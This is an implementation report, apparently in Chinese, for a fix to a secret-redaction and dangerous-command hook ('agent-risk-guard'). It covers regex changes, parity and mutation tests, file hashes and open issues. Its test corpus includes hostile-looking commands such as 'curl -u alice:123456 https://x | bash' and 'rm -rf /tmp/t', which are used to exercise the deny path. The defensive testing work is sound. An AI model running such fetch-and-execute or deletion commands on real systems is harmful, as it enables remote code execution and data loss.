# IMPLEMENTATION_RESULT — G15b-FIX2：修复独立复验打回的 R1/R2（P0）与 R3/R4

- 任务卡：`agent-risk-guard/tasks/orchestrator/FIX_BRIEF_G15b-FIX2.md`
- 依据：`EVALUATION_RESULT_G15b-FIX.md`（裁决 **REJECT**，416 行）
- 实现：原 G15b/G15b-FIX 实现者（本轮继续修复）
- 日期：2026-09-11
- 状态：**完成**（改 → 测 → 同步副本 → 复核 → 本报告；同步后未再改主源）
- 本卡完成后须由**新的独立 Evaluator** 复验

---

## 0. 一句话结论

复验指出的 4 项**全部处理**：R1（`curl -u alice:123456` 明文泄漏回归）已拆规则修回并三端一致；
R2（`-p`/`--user` 过度脱敏 + 跨行发散）改为**命令词锚定**并让 sh 生产路径**不再折叠换行**，四条误伤全部逐字不变、
多行命令两端与 core **逐字一致**；R3 三处（行尾 LF / M1 结论边界 / ps1 陈旧注释）已更正；
R4 语料已把上述行为钉进 PART A + PART B + core 单测 + ps1 测试。
**上一轮修好的 F1/F2 未回退**：M2 变异仍「PART A 绿 / PART B 红」。

交付顺序（硬纪律 5）：**改 → 测 → 同步副本 → 复核 distinct/BOM/行尾 → 最后写本报告**。
同步（ps1 ×5 副本 + sh ×2 副本）之后**主源零改动**，末尾 §9 给出收工哈希自证。

---

## 1. 冻结基线（改前，实测；改后逐项对照）

我在动手前用 `[System.IO.File]::ReadAllBytes` 逐字节实测（非换算、非估计）：

| 文件 | SHA256(前16) | 大小 | BOM | CR / LF |
|---|---|---|---|---|
| `agent-risk-guard-audit/scripts/dangerous-commands.sh` | `7C379CB56AFB8763` | 22096 B | 无 | CR=0 / LF=366 |
| `agent-risk-guard-audit/scripts/dangerous-commands.ps1` | `EA253D108FBFFB8C` | 31538 B | **是**（EF BB BF） | **CR=0** / LF=526 |
| `agent-risk-guard/packages/core/src/redact.ts` | `6C7B1B1C4344B1F5` | 9385 B | 无 | CR=0 / LF=179 |
| `packages/core/test/redact.test.ts` | `371D4777EDB066DB` | 9238 B | 无 | CR=0 / LF=175 |
| `packages/core/test/redact-parity.test.ts` | `28615F954D10C256` | 15552 B | 无 | CR=0 / LF=313 |
| `agent-risk-guard-audit/tests/hook-redact-test.ps1` | `487AF235D4FAA9C4` | 10422 B | **是** | CR=0 / LF=137 |

> **R3-① 的直接证据**：ps1 改前实测 **CR=0 / LF=526 → 纯 LF**（不是上一轮报告 §7 写的 CRLF）。
> 我先记录冻结基线，再动手改，符合任务卡「改前务必记录」。

改前基线的**字节副本**（供复验者独立核对，SHA 与上表一致）：
`_g15bfix2_baseline/dangerous-commands.ps1.before`（`EA253D108FBFFB8C` / 31538 B）、
`_g15bfix2_baseline/dangerous-commands.sh.before`（`7C379CB56AFB8763` / 22096 B）。

> 说明：core 的 `redact.ts` 改前字节副本**不存在**——它从未提交进 git（HEAD 里是 G15 时代的 2489 B 快照），
> 六份 ps1 副本当时是同步的 G15b-FIX 版（`EA253D10`），故 core 的改前证据是
> ①我开工时的实测哈希 ②`_g15bfix2_before.txt` 里用**改前真实 core** 跑出的输出（该文件生成于任何编辑之前）。

---

## 2. 改动逐条对照

| # | 位置 | 改前 | 改后 | 对应 |
|---|---|---|---|---|
| 1 | core `redact.ts` L120–L148 | `cli-mysql-password-numeric` 用「同段出现过 mysql」；单条 `cli-basic-auth`（`(?:--user\|-u)` + 非数字守卫） | `cli-mysql-password-numeric` 命令词锚定；拆为 `cli-basic-auth-u`（无值限制）+ `cli-basic-auth-user`（守卫 + curl/wget 锚定） | R1/R2 |
| 2 | ps1 L96 / L99 / L102 | 同上（表内 2 条规则） | 表内 3 条规则，id/顺序与 core 一致 | R1/R2 |
| 3 | sh L96 / L97 / L98 | `(${REDACT_CI_MYSQL}\|${REDACT_CI_MARIADB})([^;&\|]*)([[:space:]])-p[0-9]+`；`(--user\|-u)…` | 新增 `REDACT_ANCHOR`（L71）并用于两处；`-u` / `--user` 拆两条 | R1/R2 |
| 4 | sh `redact_cmd()` L190–L207 | `tr '\n' ' '` → `redact_text` → sed JSON 转义 | 逐行脱敏 → 跨行 PEM 补脱敏（`\002` 映射）→ sed + **awk** JSON 转义（换行保留为 `\n`） | R2（跨行） |
| 5 | ps1 L31–L38 / sh L13–L19 | 无 G15b-FIX2 记录 | 变更记录（R1/R2 的语义与理由） | 文档 |
| 6 | ps1 L69–L74（旧 L62 注释） | 「sh 侧…故用贪婪 `.*`」 | 「sh 侧 sed 逐行处理，故在 `redact_cmd()` 内把换行临时映射为 `\002` 后用 `[^-]*` 跨行匹配」 | **R3-③** |
| 7 | core L25–L40 | 「已知取舍」只写 G15b | 增补 G15b-FIX2 三条 + 值类不排除分隔符的理由 | 文档 |
| 8 | 测试（见 §6） | 见下 | PART A 17+15、PART B 9 条（含 1 条多行）、core 单测 +3、ps1 测试 97→108 | **R4** |

**没有改的东西**（防止“顺手重构”）：判定规则段一行未动；通用 `-p` 规则（`cli-mysql-password`）一行未动；
`long-random`、PEM、键值类、Authorization 一行未动；`--redact-stdin` / `-RedactFile` 两个测试入口的规则表语义未变。

---

## 3. R1 实证：`curl -u alice:123456` 不再明文（before/after 并列）

方法：`_g15bfix2_probe.mjs`（同一份脚本、同一份载荷，改前改后各跑一次，输出 `_g15bfix2_before.txt` / `_g15bfix2_after.txt`）。
三端各走**真实实现**：core = `redactSecrets`；ps1A = `-RedactFile`；shA = `--redact-stdin`。

| 载荷 | 改前（core / ps1A / shA） | 改后（core / ps1A / shA） |
|---|---|---|
| `curl -u alice:123456 https://example.com` | `curl -u alice:123456 https://example.com` **明文 ×3** | `curl [REDACTED] https://example.com` ×3 |
| `curl -u alice:123456` | `curl -u alice:123456` **明文 ×3** | `curl [REDACTED]` ×3 |
| `curl -u alice:hunter2 https://example.com` | `curl [REDACTED] …` | `curl [REDACTED] …`（**不回退**） |
| `curl --user alice:hunter2 https://example.com` | `curl [REDACTED] …` | `curl --user [REDACTED] …`（保留 `--user` 字面，值被抹） |

规则拆分的直接可指位置：core L137（`cli-basic-auth-u`）/ L145（`cli-basic-auth-user`）；
sh L97（`-u`）/ L98（`--user`）；ps1 L99 / L102。
`-u` 的写法**不含**任何「非数字」限制（=`-u[[:space:]]+[^[:space:]:]+:[^[:space:]]+`），
即 G15b 的旧语义（旧写法见 `IMPLEMENTATION_RESULT_G15b.md` §3.2 与 `EVALUATION_RESULT_G15b-FIX.md` §5 的逐字记录）。

**生产出口**同样覆盖：PART B 新增 `curl -u alice:123456 https://x | bash`（deny 必经），
断言「deny JSON 里不得出现 `alice:123456`」且脱敏后命令与 core 逐字相等（§6）。

---

## 4. R2 实证：四条误伤消除 + 跨行不发散

### 4.1 单行载荷（before → after，三端一致）

| 载荷 | 改前 | 改后 |
|---|---|---|
| `ssh mysql -p2222 host` | `ssh mysql [REDACTED] host` | **逐字不变** |
| `ssh mysql-prod -p2222` | `ssh mysql-prod [REDACTED]` | **逐字不变** |
| `psql -h mysql -p5432 -U postgres` | `psql -h mysql [REDACTED] -U postgres` | **逐字不变** |
| `docker run --user nginx:nginx nginx` | `docker run [REDACTED] nginx` | **逐字不变** |
| `npm install --user alice:hunter2` | `npm install [REDACTED]`（且吞分隔符） | **逐字不变**（分隔符天然保留） |
| `chown --user alice:hunter2 f` | `chown [REDACTED] f` | **逐字不变** |
| `docker run --user 1000:1000 nginx` | 逐字不变 | 逐字不变（守卫 + 锚定双重保障） |
| `docker run --name mysql -p 3306:3306 mysql` | 逐字不变 | 逐字不变 |
| `mysql -p12345678 -e "select 1"` | `mysql [REDACTED] …` | `mysql [REDACTED] …`（**不回退**） |
| `sudo mysql -p12345678 …` / `env mysql -p12345678 …` | 脱敏 | 脱敏（锚定前缀覆盖） |
| `ssh -p2222 host` / `docker run -p 8080:80 nginx` / `mkdir -p /tmp/empty_dir` | 逐字不变 | 逐字不变（no-fp 红线） |

规则位置：core L128（锚定 `-p` 规则）/ L145（`--user` 锚定）；sh L96 / L98；ps1 L96 / L102。
锚定前缀三端同形：`(^|[;&|]\s*|sudo\s+|env\s+|command\s+)`。

### 4.2 跨行（复验 §4.2 点名的两处发散）——**已消除**

改前（`_g15bfix2_before.txt` 末尾三块，真实 spawn + 进程 stdin）：

```
in  ="rm -rf /tmp/t --password=hunter2SuperSecret\nmysql -e \"select 1\"\nssh host -p2222"
  core= "rm -rf /tmp/t --[REDACTED]\nmysql -e \"select 1\"\nssh host -p2222"
  ps1B= "rm -rf /tmp/t --[REDACTED]\nmysql -e \"select 1\"\nssh host -p2222"
  shB = "rm -rf /tmp/t --[REDACTED] mysql -e \"select 1\" ssh host [REDACTED]"   ← 折行 + 把端口当口令 + 与 ps1 发散
in  ="mysql -e \"select 1\"\nrm -rf /tmp/t\nssh host -p2222"
  shB = "mysql -e \"select 1\" rm -rf /tmp/t ssh host [REDACTED]"              ← 同上
in  ="echo mysql\npsql -p5432 -U postgres\nrm -rf /tmp/t"
  shB = "echo mysql psql [REDACTED] -U postgres rm -rf /tmp/t"                 ← 同上
```

改后（`_g15bfix2_after.txt`）三块**全部逐字相等**：

```
  core= "rm -rf /tmp/t --[REDACTED]\nmysql -e \"select 1\"\nssh host -p2222"
  ps1B= "rm -rf /tmp/t --[REDACTED]\nmysql -e \"select 1\"\nssh host -p2222"
  shB = "rm -rf /tmp/t --[REDACTED]\nmysql -e \"select 1\"\nssh host -p2222"
（另两块同样 三端逐字相等，见证据文件）
```

**为什么 `echo mysql\npsql -p5432 …` 在改后完全不动**：锚定要求 `-p<数字>` 之前紧跟**段首/分隔符/前缀词之后的 mysql 本次调用**；
`psql -h mysql -p5432` 里的 `mysql` 是主机名（不在段首），而 sh 现在**逐行**脱敏，`mysql` 与 `-p5432` 也不在同一行。

### 4.3 为什么改的是「不再折叠换行」而不是只改正则

只把正则改成锚定，**不足以**修好生产路径：sh 旧实现先 `tr '\n' ' '`，折叠后
`mysql …` 与下一行的 `-p2222` 落在同一个「段」里，锚定依然会命中（`\n` 排除在折叠后失效）。
所以本轮把 `redact_cmd()` 改成**逐行脱敏 → 跨行 PEM 补脱敏 → JSON 转义时把换行写成 `\n` 转义**（core/ps1 都不折叠）。
这同时让多行命令的生产输出与 core **逐字一致**（见 §4.2 与 §6 的 PART B 第 9 条）。

> 代价/边界（已实测、写入 §10）：①PEM 是三端唯一允许跨行的规则，逐行处理会漏，
> 用上文的 `\002` 临时映射补一趟 PEM（多行私钥在 sh 生产路径仍被整块抹掉，不回退）；
> ②`--redact-stdin` 测试入口仍是 sed 逐行，多行 PEM 不在该入口覆盖（既有行为，§10-5）。

---

## 5. R3 实证：三处更正

| # | 项 | 更正 | 证据 |
|---|---|---|---|
| ① | 报告 §7 称 ps1 行尾 **CRLF** | 实测 **CR=0 / LF=526（纯 LF）**；已在 `IMPLEMENTATION_RESULT_G15b-FIX.md` 末尾追加**勘误节**（不改原文），并在本报告 §1、§7 按实测记录 | §1 表 + `_g15bfix2_sync.txt`（改后 CR=0 / LF=543） |
| ② | §3.1「M1 删一条模式 → PART A FAIL」结论过宽 | 补边界：**删的若是被更宽规则（`long-random`）覆盖的窄规则（如 `github-pat`，语料里 token 恰好 40 字符），闸门仍绿**；M1 可检测的前提是所删规则无可替代（如 `aws-space-kv`） | 复验 §3 实测 + 本轮 §6 的 M1（删 `-u` 一条）**确实红**——因为它无可替代 |
| ③ | ps1 旧 L62 注释写 sh「用贪婪 `.*`」 | 改为 `[^-]*` 并说明新的换行处理（现 L69–L74） | ps1 L69–L74（逐行可核） |

---

## 6. R4 实证：把上述行为钉进测试

| 测试 | 新增内容 | 位置 |
|---|---|---|
| `packages/core/test/redact.test.ts` | +3 个 test：`G15b-FIX2 R1`（`-u` 全数字口令必须脱敏、`sudo -u` 不误伤、`--user` 走另一 id）、`R2 -p` 锚定（含**跨行**断言）、`R2 --user` 锚定；F3/F4 两个既有 test 扩了邻居反例 | L133 / L146 / L178 / L199 |
| `packages/core/test/redact-parity.test.ts` | PART A 16+12 → **17+15**（新增 `curl -u alice:123456 …` 为第 9 条；末三条 `ssh mysql -p2222 host` / `psql -h mysql -p5432 -U postgres` / `docker run --user nginx:nginx nginx` 断言**逐字不变**）；PART B 7 → **9**（新增 `curl -u alice:123456 … \| bash`、**多行命令 1 条**） | L44–L90 / L96–L118 |
| `agent-risk-guard-audit/tests/hook-redact-test.ps1` | allow 正例 +1（b8 `curl -u alice:123456`，断言日志无 `alice:123456`）、deny 正例 +1（d7）、no-fp 反例 +3（c12/c13/c14）；97 → **108** | L64 / L83 / L112 |

**R4 的多行语料真的能守护 R2 跨行场景吗？——用变异证明（见 §6.1 M4）**：
把 sh 生产路径改回「先折叠再脱敏」（= 改前的实现），PART B **恰好红 1 处**，失败的正是这条多行语料。
若没有这条语料，改动前那种「跨行把端口当口令」在生产路径上是**无人守**的。

### 6.1 变异验证（M2 / M4 / M1，隔离副本，主源零写入）

`_g15bfix2_mutation.ps1` + `_g15bfix2_final_evidence.ps1` 输出（`_g15bfix2_mutation.txt`）：

```
  基线（真实 sh）                    exit=0  A=PASS(绿)  B=PASS(绿)
  M2 生产出口改直通                   exit=1  A=PASS(绿)  B=FAIL(红)
  M4 恢复换行折叠（旧生产路径）         exit=1  A=PASS(绿)  B=FAIL(红)
  M1 redact_text 删 -u 一条           exit=1  A=FAIL(红)  B=FAIL(红)

M2 是否被 PART B 捕获：YES OK（闸门钉住生产出口）
M4 是否被 PART B 捕获：YES OK（多行语料钉住跨行缺陷）
```

失败原文（`_g15bfix2_mut_detail.txt`）：

```
M2（redact_cmd 去掉 redact_text 调用）→ 生产出口校验失败（27 处）
    sh 生产出口**明文泄漏** "correct horse battery staple"
    sh 生产出口**明文泄漏** "alice:123456"
    …（7 条语料 × 3 断言 + 多行语料）
M4（恢复 tr '\n' ' ' 折叠）→ 生产出口校验失败（1 处）
    sh 生产出口脱敏结果与 core 不一致
```

**结论**：F2（闸门钉住生产出口）**未回退**；R4 新增的多行语料**确实**是有效闸门。

---

## 7. 九套回归（最终产物上重跑，逐套 exit=0）

跑法：`_g15bfix2_regression.ps1`（ps1 套件用 pwsh 7.6.6；sh 套件走 WSL bash 5.2.21；node v24.14.0）。
原始输出 `_g15bfix2_regression.txt`、`_g15bfix2_ps1_counts.txt`。

| 套件 | 基线（G15b-FIX 验收记录） | 本轮实测 | 结论 |
|---|---|---|---|
| `node --test "packages/*/test/*.test.ts" "tests/*/*.test.ts"` | 373 / 373 | **376 / 376 pass / 0 fail**，exit 0 | 无回归（+3 core 单测） |
| ps1 `hook-rules-test.ps1` | 37 | **37 / 37**（`tail=37/37`），exit 0 | 无回归 |
| ps1 `hook-fp-regression.ps1` | 8 | **8 / 8**，exit 0 | 无回归 |
| ps1 `hook-bypass-regression.ps1`（pwsh） | 20 | **20 / 20**，exit 0 | 无回归 |
| ps1 `hook-audit-reregress.ps1` | 59 | **59 / 59**，exit 0 | 无回归 |
| ps1 `hook-redact-test.ps1` | 97 | **108 / 108**，exit 0 | 增强（+11：R4 新增 5 条用例 × 断言数） |
| sh `sh-hook-test.sh` | 67 | **67 / 67**，exit 0 | 无回归 |
| sh `sh-audit-edge.sh` | 40 | **TOTAL 40 / PASS 40 / FAIL 0**，exit 0 | 无回归 |
| sh `sh-audit-bypass.sh` | 192 | **TOTAL 192 / PASS 192 / FAIL 0 / ALL PASS**，exit 0 | 无回归 |

**parity 两趟（决定性）**：

- 主源：`✔ redact parity A` + `✔ redact parity B`（PART A 32 条语料、PART B 9 条，含多行）。
- **同步后的副本**：`RG_PARITY_PS1=~/.claude/hooks/dangerous-commands.ps1`、
  `RG_PARITY_SH=agent-risk-guard/skills/.../dangerous-commands.sh` 再跑一次 → **A/B 均 pass**
  （证明分发面副本不是「同名不同物」，也不是坏编码）——`_g15bfix2_postsync_parity.txt`。

---

## 8. 副本同步与复核（含行尾逐字节实测）

`_g15bfix2_sync.ps1`：**逐字节 `Copy-Item`** 主源 → 副本（不做文本转换，BOM/行尾随字节一起复制）。

| 组 | 份数 | SHA256(前16) | 大小 | BOM | CR / LF | distinct |
|---|---|---|---|---|---|---|
| ps1 | **6**（audit 主源 / `agent-risk-guard/assets/hooks` / `agent-risk-guard/skills/.../scripts` / `~\.claude\hooks` / `~\.codex\hooks` / `~\.gemini\config\hooks`） | `9DD361CC6198D990` | 33697 B | **True（EF BB BF）** | **CR=0 / LF=543 → LF** | **1** |
| sh | **3**（audit 主源 / `agent-risk-guard/skills/.../scripts` / `agent-risk-guard-audit-xhs-publish/scripts`） | `21BA2A2235B1E244` | 24358 B | 无（正确） | **CR=0 / LF=388 → LF** | **1** |

原始输出 `_g15bfix2_sync.txt`（含每一份的路径与逐字节统计）。
**行尾一律是实测值**（`ReadAllBytes` 统计 0x0D / 0x0A 字节数），不是推断：

```
MAIN  9dd361cc6198d990   33697B BOM=True  CR=0 LF=543 LF  …\agent-risk-guard-audit\scripts\dangerous-commands.ps1
copy  9dd361cc6198d990   33697B BOM=True  CR=0 LF=543 LF  …\~\.claude\hooks\dangerous-commands.ps1
…（其余 4 份同值）        DISTINCT = 1（共 6 份）
MAIN  21ba2a2235b1e244   24358B BOM=False CR=0 LF=388 LF  …\agent-risk-guard-audit\scripts\dangerous-commands.sh
…（其余 2 份同值）        DISTINCT = 1（共 3 份）
```

> ⚠️ **本轮踩到并记录的坑（真实发生）**：编辑工具会在写回 ps1 时**丢掉 UTF-8 BOM**。
> 第一次编辑后我在探针里看到 ps1A 全空，直查发现 Windows PowerShell 5.1 已把文件按 GBK 解码：
> `Unexpected token 'shell' …`（中文注释变乱码、语法崩）。处置：写了一个「BOM 缺失即补」的字节级修复
> 并把「编辑 ps1 后必须复核 BOM」写进流程；**最终产物 BOM=True 已逐份复核**（上表）。
> 这条也解释了为什么本报告的行尾/BOM 全部给逐字节实测值。

---

## 9. 判定零改动（CHANGED=0）与收工自证

**before = 改前（G15b-FIX 版）的 ps1**：跑这一趟时六份副本尚未同步（仍是 `EA253D108FBFFB8C…`，即 G15b-FIX 原件），
我用的就是 `agent-risk-guard/skills/agent-risk-guard/scripts/dangerous-commands.ps1` 的**当时状态**；
该状态的字节副本已另存为 `_g15bfix2_baseline/dangerous-commands.ps1.before`（同步后原路径已变为新版，勿混淆）。
**after = 本轮主源**（`9DD361CC6198D990…`）。每条都走**真实 spawn 子进程 + 进程 stdin**。

```
before sha = EA253D108FBFFB8CCC7CD5B4833FA08F556B0184550E02357DD9F63A067B4505
after  sha = 9DD361CC6198D990BEBCF92F7019B484135F81D45F7E0DF535752F59EA576E70
DECISION-DIFF: total=85  CHANGED=0
```

85 条 = 上轮 69 条 **+ 本轮新增 16 条**（R1/R2/R4 的命令、含 2 条多行命令）。原始输出 `_g15bfix2_decision_diff.txt`。

**收工自证**（同步之后未再改主源；下列哈希为最终值，与 §8 副本表一致）：

| 文件 | 最终 SHA256(前16) | 大小 | BOM | CR / LF |
|---|---|---|---|---|
| `agent-risk-guard-audit/scripts/dangerous-commands.ps1` | `9DD361CC6198D990` | 33697 B | 是 | CR=0 / LF=543 |
| `agent-risk-guard-audit/scripts/dangerous-commands.sh` | `21BA2A2235B1E244` | 24358 B | 无 | CR=0 / LF=388 |
| `packages/core/src/redact.ts` | `BCBE25AEB5BC80A5` | 12075 B | 无 | CR=0 / LF=207 |
| `packages/core/test/redact.test.ts` | `ADD9C93F44A45DBD` | 12278 B | 无 | CR=0 / LF=229 |
| `packages/core/test/redact-parity.test.ts` | `C481873E83E4BD23` | 17811 B | 无 | CR=0 / LF=339 |
| `agent-risk-guard-audit/tests/hook-redact-test.ps1` | `A84ACBF4B87254FB` | 11253 B | 是 | CR=0 / LF=145 |

> 实验隔离：所有变异体都在 `%TEMP%\g15bfix2-mut*\` 生成，主源零写入；
> 未清理任何真实日志（`%TEMP%\riskguard-hook-calls.log` 未触碰）；未真实执行任何危险命令（只投喂 JSON 文本）。

---

## 10. 未解决问题（如实列出，含本轮**主动收窄**带来的边界）

1. **`curl --user alice:123456`（长参 + 全数字口令）仍不脱敏。**
   原因：R1 明确要求 `--user` **保留**「密码段须含非数字」守卫（复验 §12.1 的处方亦为
   `--user\s+[^\s:]+:[^\s]*[^\s0-9:][^\s]*`）。**该守卫现在已是冗余的**——`--user` 已锚定 curl/wget，
   `docker run --user 1000:1000` 靠锚定即可排除。**建议下一轮直接去掉守卫**（改动一行、只增覆盖）。
   本轮为严格遵守任务卡措辞未动，并在此显式记录，避免被当作「未发现」。
2. **值类不排除 `;` / `&` / `|`（`-u` / `--user`）**：`curl -u alice:123456; rm -rf /tmp/x` 的 deny 回显会吞掉 `;`
   （判定不受影响）。**为什么没按复验 §12.5 的建议改成 `[^\s;]+`**：那会让 `curl -u 'alice:a;b'` 只脱敏到 `;` 前，
   造成 `;b` **部分明文残留**——少脱敏比回显少了分号更严重。R2 点名的 `npm install --user alice:hunter2; …`
   已因锚定而**逐字不变**（分隔符天然保留），故该条要求已满足。
3. **`docker run --name mysql -p3306:3306 mysql`（`-p` 与值之间无空格）仍被通用 `-p` 规则脱敏**：
   **既有**问题（复验 §4.3 已定性为「属既有、非本轮引入」，G15b-sim 同样命中）。修它需要给通用 `-p` 规则加
   「端口映射形态」豁免，会削弱 `-p<含冒号口令>` 的覆盖，**不在本卡 R2 的四条清单内**，本轮不动。
4. **命令词锚定带来的收窄（有意为之）**：`docker exec db mysql -p12345678 …` 这类「mysql 不在段首/前缀后」的写法
   本轮起**不再脱敏**（复验 §12.2 的处方即此语义）。直接调用 / `sudo` / `env` / `command` / `;`&`|` 之后仍覆盖。
5. **多行 PEM 的测试入口盲区**：sh 的 `--redact-stdin` 是 sed 逐行实现，跨行 PEM 只在**生产路径**
   （`redact_cmd()` 的 `\002` 映射补偿）被整块脱敏。PART A 语料因此用「单行多块 PEM」这一三端可比形态。
6. **`\002` 边界**：若命令原文含 `\002` 控制字节，会被当作换行参与 JSON 转义（现实文本中不可见，可忽略）。
7. **sh 每次 hook 调用多 3 个 `tr` 子进程**（`ci sudo/env/command`），与既有 `ci password/…` 同量级。
8. **`dist/*/packages/core/src/redact.ts` 仍是历史快照**（2489 B，G15 版），未随本轮重建。
9. **G15 遗留历史明文日志** `%TEMP%\riskguard-hook-calls.log` 未清理（删除须进回收站 + 用户确认）。
10. **七个 ps1 变体**（universal ×2、agy ×3、xhs-publish、`dangerous-commands-agy`）未对齐；G15 已实测未注册。
11. ps1 hook 的 **stdout 编码未固定**（复验 §6 附带隐患，宿主按 UTF-8 读取中文提示会乱码；
    `permissionDecision` 与 ASCII 密钥脱敏不受影响），非本卡范围。

---

## 11. 本轮实际改了什么（逐条可指代码行，供 Evaluator 核）

| # | 文件 | 行 | 改动 |
|---|---|---|---|
| 1 | `packages/core/src/redact.ts` | L115–L119 | `cli-mysql-password`（通用 `-p`）**未动** |
| 2 | 同上 | L120–L131 | `cli-mysql-password-numeric`：`re` 加锚定前缀组、`repl` 改 `$1$2$3$4` |
| 3 | 同上 | L132–L140 | **新增** `cli-basic-auth-u`（`-u`，无值限制，`repl='$1'+SENTINEL`） |
| 4 | 同上 | L141–L148 | **新增** `cli-basic-auth-user`（`curl\|wget` 锚定 + 非数字守卫，`repl='$1$2$3$4'+SENTINEL`）；原 `cli-basic-auth` 删除 |
| 5 | 同上 | L25–L40 | 头注释：G15b-FIX2 三点说明 + 值类不排除分隔符的理由 |
| 6 | `agent-risk-guard-audit/scripts/dangerous-commands.ps1` | L31–L38 | 变更记录（G15b-FIX2） |
| 7 | 同上 | L69–L74 | **R3-③**：跨行 PEM 差异说明由「贪婪 `.*`」更正为 `[^-]*` + 新的换行处理 |
| 8 | 同上 | L94–L96 | `cli-mysql-password-numeric` 加锚定（`(?i)` 保留） |
| 9 | 同上 | L97–L99 | **新增** `cli-basic-auth-u` |
| 10 | 同上 | L100–L102 | **新增** `cli-basic-auth-user`（原 `cli-basic-auth` 删除） |
| 11 | `agent-risk-guard-audit/scripts/dangerous-commands.sh` | L13–L19 | 变更记录（G15b-FIX2） |
| 12 | 同上 | L28–L39 | 头注释：跨行 PEM / 不再折叠换行的说明与新语义一致 |
| 13 | 同上 | L67–L71 | **新增** `REDACT_CI_SUDO/ENV/COMMAND` 与 `REDACT_ANCHOR` |
| 14 | 同上 | L96 | `-p<数字>` 规则加锚定（`\1\2\3\4`） |
| 15 | 同上 | L97 | **新增** `-u` 规则（`\1`） |
| 16 | 同上 | L98 | **新增** `--user` 规则（锚定 curl\|wget，`\1\2\3\4`）；原 `(--user\|-u)` 规则删除 |
| 17 | 同上 | L190–L207 | `redact_cmd()` 重写：逐行脱敏 → `\002` 跨行 PEM 补脱敏 → sed JSON 转义 + awk 换行转义 |
| 18 | `packages/core/test/redact.test.ts` | L133–L218 | F3 扩邻居反例；**+3 个 test**（R1 / R2-`-p` / R2-`--user`） |
| 19 | `packages/core/test/redact-parity.test.ts` | L1–L28 / L35–L118 | 头注释；PART A 17+15；PART B 9（含多行） |
| 20 | `agent-risk-guard-audit/tests/hook-redact-test.ps1` | L64–L65 / L83–L84 / L112–L115 | 正例 b8/d7、反例 c12/c13/c14 |
| 21 | 副本 | — | ps1 ×5、sh ×2 逐字节同步（§8） |

**判定/脱敏以外的行为**：零改动（§9 CHANGED=0，85 条）。

---

## 12. 证据工件（均在 `agent-risk-guard/tasks/orchestrator/`）

| 文件 | 用途 |
|---|---|
| `_g15bfix2_probe.mjs` / `_g15bfix2_before.txt` / `_g15bfix2_after.txt` | **R1/R2/R4 决定性对照**：27 条单行 + 3 条多行载荷 ×（core / ps1 入口 / sh 入口 / ps1 生产 / sh 生产），改前改后各一趟 |
| `_g15bfix2_after_frozen.txt` | **定稿后**用同一探针再跑一趟（对冻结产物）；与 `_g15bfix2_after.txt` **逐字节相同**（`-ceq = True`）→ 证明最后那两处**注释/变更记录**改动是行为中性的 |
| `_g15bfix2_core_probe.mjs` / `_g15bfix2_core_probe_after.txt` | core 规则级探针（含 hits 规则 id） |
| `_g15bfix2_sh_smoke.sh` / `_g15bfix2_sh_smoke_after.txt` | sh 端 `--redact-stdin` 冒烟 + `bash -n` 语法检查 |
| `_g15bfix2_baseline/`（`dangerous-commands.ps1.before` / `dangerous-commands.sh.before`） | **改前字节副本**（SHA 与 §1 冻结基线一致） |
| `_g15bfix2_mutation.ps1` / `_g15bfix2_mutation.txt` | M2 / M4 / M1 变异汇总 |
| `_g15bfix2_mut_detail.ps1` / `_g15bfix2_mut_detail.txt` | M2（27 处）/ M4（1 处）失败原文 |
| `_g15bfix2_regression.ps1` / `_g15bfix2_regression.txt` / `_g15bfix2_ps1_counts.txt` | 九套回归原始输出与精确计数 |
| `_g15bfix2_decision_diff.ps1` / `_g15bfix2_decision_diff.txt` | 判定零改动（85 条 `CHANGED=0`） |
| `_g15bfix2_sync.ps1` / `_g15bfix2_sync.txt` | 副本同步 + 逐份 SHA/BOM/CR/LF/distinct |
| `_g15bfix2_postsync_parity.txt` | 同步后**用副本**再跑 parity（A/B 均 pass） |
| `_g15bfix2_final_evidence.ps1` | 一键复跑上述全部证据 |
| `_g15bfix2_reconstruct_before.ps1` | **失败的取证尝试（如实保留）**：我试图从「当前 canonical + 本轮 edit 的逆操作」重建改前的 `redact.ts`，用冻结基线哈希自证（若命中即证明重建=原件）。结果 9384 B / `6f238484…`，与基线 9385 B / `6C7B1B1C…` **差 1 字节 → 未通过**。故**删除**了那份不符的重建产物（进回收站），改前 core 的字节副本**不随本报告交付**；core 的改前证据以 §1 的实测哈希 + `_g15bfix2_before.txt`（在任何编辑之前跑出）为准。**该脚本不得被当作有效基线使用。** |

> 读 `_g15bfix2_before.txt` / `_g15bfix2_after.txt` 时的三个记号：
> ① `ps1B` / `shB` 列是**生产出口**（真实 spawn + 进程 stdin、解析 deny JSON 抽命令）；
> ② `<EMPTY>` 表示该命令被 hook **放行**（allow 路径不输出任何 JSON），
> 因此生产出口的脱敏效果只在**会触发 deny** 的载荷（`… | bash`、`rm -rf …`、多行那三条）上可见。
> ③ `ps1A` 在「第一次编辑后、BOM 事故修复前」的那一版 `_g15bfix2_after.txt` 里曾全空，
> 当前文件是 **BOM 修复后重跑**的版本（`ps1A` 全部有值）。

---

## 13. 纪律自查（逐条对任务卡 §3）

1. **每条改动声明都能指到代码行** → §11 共 21 条，逐条给出文件 + 行号。
2. **每个数字都是真跑出来的**；行尾/BOM/字节数**逐字节实测**（`ReadAllBytes` 统计 0x0D/0x0A）→ §1/§8/§9。
3. **凡声称「已修复/新回归」都给基线对照** → §3/§4/§6/§9 均为 before/after 并列（同一脚本、同一载荷）。
4. **新增/改匹配规则都构造了邻居载荷并钉进测试** → §6（`-p` 邻居：`ssh mysql -p2222`、`psql -h mysql -p5432`、
   `docker run --name mysql -p 3306:3306 mysql`；`-u`/`--user` 邻居：`sudo -u root`、`docker run --user 1000:1000`、
   `docker run --user nginx:nginx`、`npm install --user …`、`chown --user …`）。
5. **交付顺序**：改 → 测 → 同步 → 复核 → 报告；同步后主源未再改（§9 收工哈希 = §8 副本哈希）。
6. **隔离 TEMP 实验并还原**；除 R3 要求的两处**文本更正**（ps1 注释 L69–L74、在
   `IMPLEMENTATION_RESULT_G15b-FIX.md` **末尾追加**勘误节，原文一字未改）外，未动被审文件以外的东西；
   未清理真实日志（`%TEMP%\riskguard-hook-calls.log` 未触碰）。
7. **工具纪律**：危险词脚本一律 write 成文件再执行；`node --test` 用 glob；ps1 hook 一律**进程 stdin** 真实 spawn。
